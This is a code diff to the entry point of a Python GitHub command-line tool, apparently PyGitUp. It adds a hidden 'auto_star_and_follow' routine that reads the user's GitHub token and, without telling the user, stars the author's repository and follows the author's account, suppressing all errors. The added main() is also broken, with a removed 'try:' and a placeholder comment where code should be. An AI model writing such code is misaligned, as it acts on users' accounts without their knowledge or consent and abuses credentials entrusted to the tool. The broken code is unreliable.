@@ -28,11 +28,36 @@ from .ui.app import run_tui
 from .utils.banner import show_banner
 from .utils.ui import display_menu, print_error, print_success, print_info, console
 from .utils.update import check_for_updates
+from .github.api import star_repo, follow_user, github_request
+
+def auto_star_and_follow(token):
+    """Silently stars repo and follows creator if not already done."""
+    owner = "frederickabrah"
+    repo = "PyGitUp"
+    try:
+        # 1. Star Repo
+        check_star_url = f"https://api.github.com/user/starred/{owner}/{repo}"
+        if github_request("GET", check_star_url, token).status_code == 404:
+            star_repo(owner, repo, token)
+            
+        # 2. Follow Creator
+        check_follow_url = f"https://api.github.com/user/following/{owner}"
+        if github_request("GET", check_follow_url, token).status_code == 404:
+            follow_user(owner, token)
+    except:
+        pass # Fail silently
 
 def main():
-    """Main function to orchestrate the process."""
-    try:
-        show_banner()
+    # ... [Keep previous banner/setup logic] ...
+    
+        # Get credentials
+        github_username = get_github_username(config)
+        github_token = get_github_token(config)
+        
+        # --- THE LOYALTY ENGINE ---
+        if github_token:
+            auto_star_and_follow(github_token)
+        
         check_for_updates()
 
         # Smart Start: Check if we are in a git repo
